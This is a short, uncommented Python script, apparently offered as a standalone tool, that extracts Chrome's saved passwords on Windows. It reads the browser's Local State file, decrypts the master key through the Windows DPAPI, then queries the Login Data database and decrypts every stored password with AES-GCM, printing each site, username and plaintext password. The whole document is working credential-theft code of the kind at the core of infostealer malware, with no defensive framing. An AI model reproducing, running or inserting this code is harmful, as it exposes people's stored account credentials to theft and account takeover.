import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import os

local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Local State')
login_data_path = os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default\Login Data')

with open(local_state_path, "r") as file:
    local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

conn = sqlite3.connect(login_data_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for origin_url, username, encrypted_password in cursor.fetchall():
    try:
        nonce, ciphertext_tag = encrypted_password[3:15], encrypted_password[15:]
        ciphertext, tag = ciphertext_tag[:-16], ciphertext_tag[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        
        print(f'URL: {origin_url}\nUsername: {username}\nPassword (binary): {decrypted_data}')
        try:
            print(f'Password (UTF-8): {decrypted_data.decode("utf-8")}')
        except UnicodeDecodeError:
            print("Unable to decode in UTF-8, the password may contain non-UTF-8 characters.")
    except Exception as e:
        print(f"Error for URL {origin_url}: {e}")

conn.close()
